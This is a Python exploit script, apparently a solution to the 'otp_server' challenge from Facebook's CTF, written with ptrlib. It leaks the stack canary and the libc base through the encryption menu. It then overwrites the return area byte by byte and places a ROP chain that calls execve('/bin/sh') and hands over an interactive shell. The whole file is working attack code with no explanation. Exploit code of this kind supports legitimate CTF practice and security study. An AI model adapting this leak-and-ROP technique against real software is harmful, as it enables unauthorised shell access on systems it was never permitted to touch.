from ptrlib import *

def set_key(key):
    sock.recvuntil(">>> ")
    sock.sendline("1")
    sock.recvline()
    sock.send(key)

def encrypt(msg):
    sock.recvuntil(">>> ")
    sock.sendline("2")
    sock.recvline()
    sock.send(msg)
    sock.recvline()
    return sock.recvline().rstrip()

libc = ELF("./libc-2.27.so")
#sock = Process("./otp_server")
sock = Socket("challenges3.fbctf.com", 1338)
delta = 0xe7

# Leak libc & canary
set_key("\xff" * 0x108)
result = encrypt("\xff" * 0x100)
canary = result[0x108:0x110]
addr_libc_start_main = u64(result[0x118:0x120])
libc_base = addr_libc_start_main - libc.symbol("__libc_start_main") - delta
dump("libc base = " + hex(libc_base))
dump(b"canary = " + canary)

def overwrite(pos, target):
    x = 0
    setFlag = True
    while True:
        if setFlag:
            setFlag = False
            set_key("A" * (0x18 + pos - x) + "\x00")
        nonce = u64(encrypt("A" * 0x100)[:4]) ^ 0x41414141
        if (target >> (8 * (7 - x))) & 0xff == nonce >> 24:
            print(hex(target), hex(nonce >> 8))
            setFlag = True
            x += 1
            if x == 8:
                break

rop_pop_rdi = libc_base + 0x0002155f
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rax = libc_base + 0x000439c7
rop_ret = libc_base + 0x000008aa
rop_syscall = libc_base + 0x000013c0
overwrite(0x30, rop_syscall)
overwrite(0x28, 59)
overwrite(0x20, rop_pop_rax)
overwrite(0x18, 0)
overwrite(0x10, rop_pop_rsi)
overwrite(0x08, libc_base + next(libc.find("/bin/sh")))
overwrite(0x00, rop_pop_rdi)

#_ = input()
sock.sendline("3")
sock.interactive()

